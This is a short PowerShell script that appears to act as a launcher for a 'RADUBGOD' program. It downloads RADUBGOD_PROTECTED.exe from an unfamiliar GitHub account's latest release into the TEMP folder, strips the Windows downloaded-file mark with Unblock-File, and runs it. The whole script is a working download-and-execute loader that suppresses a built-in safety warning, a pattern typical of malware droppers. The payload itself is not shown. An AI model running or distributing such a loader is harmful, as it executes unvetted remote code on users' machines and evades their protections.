$ErrorActionPreference = 'Stop'
$base = 'https://github.com/darapedbxystyle-hub/radubgod/releases/latest/download'
$exe = Join-Path $env:TEMP 'RADUBGOD_PROTECTED.exe'

try {
    $head = [Net.HttpWebRequest]::Create("$base/RADUBGOD_PROTECTED.exe")
    $head.Method = 'HEAD'
    $head.Timeout = 20000
    $remoteBytes = [int64]$head.GetResponse().ContentLength
} catch {
    $remoteBytes = 0
}

$needDownload = $true
if ($remoteBytes -gt 0 -and (Test-Path $exe) -and (Get-Item $exe).Length -eq $remoteBytes) {
    $needDownload = $false
}

if ($needDownload) {
    try {
        Invoke-WebRequest "$base/RADUBGOD_PROTECTED.exe" -OutFile $exe -UseBasicParsing -TimeoutSec 120
        try { Unblock-File -Path $exe } catch { }
    } catch {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show(
            "Could not download RADUBGOD. Check your internet connection and try again.",
            "RADUBGOD PROJECT",
            'OK', 'Error') | Out-Null
        exit 1
    }
}

Start-Process $exe
